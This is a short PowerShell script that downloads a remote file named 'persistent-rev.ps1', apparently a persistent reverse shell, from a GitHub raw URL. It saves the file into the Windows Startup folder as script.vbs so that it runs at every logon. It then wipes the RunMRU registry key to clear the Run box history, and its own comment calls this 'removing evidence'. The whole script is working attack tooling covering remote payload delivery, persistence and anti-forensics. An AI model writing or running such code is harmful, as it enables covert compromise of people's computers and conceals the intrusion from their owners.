# Define the GitHub raw link of the PowerShell script
$githubRawLink = "https://raw.githubusercontent.com/rude90/only-powershell/main/persistent-rev.ps1"

# Define the path to the startup folder
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the filename for the downloaded script
$scriptFilename = "script.vbs"

# Combine the startup folder path with the script filename
$destinationPath = Join-Path -Path $startupFolder -ChildPath $scriptFilename

# Function to clean up after script execution
function Clean-Exfil {
    <#
    .NOTES 
        This function cleans up after script execution, removing evidence.
    #>

    try {
        # Delete run box history
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f | Out-Null

        Write-Host "Run box history cleared."
    }
    catch {
        Write-Error "Failed to clear run box history: $_"
    }
}

# Download the script from GitHub
try {
    Invoke-WebRequest -Uri $githubRawLink -OutFile $destinationPath
    Write-Host "Script downloaded and saved to startup folder successfully."
    Clean-Exfil  # Clean up after script execution
} 
catch {
    Write-Host "Failed to download or save the script: $_"
}
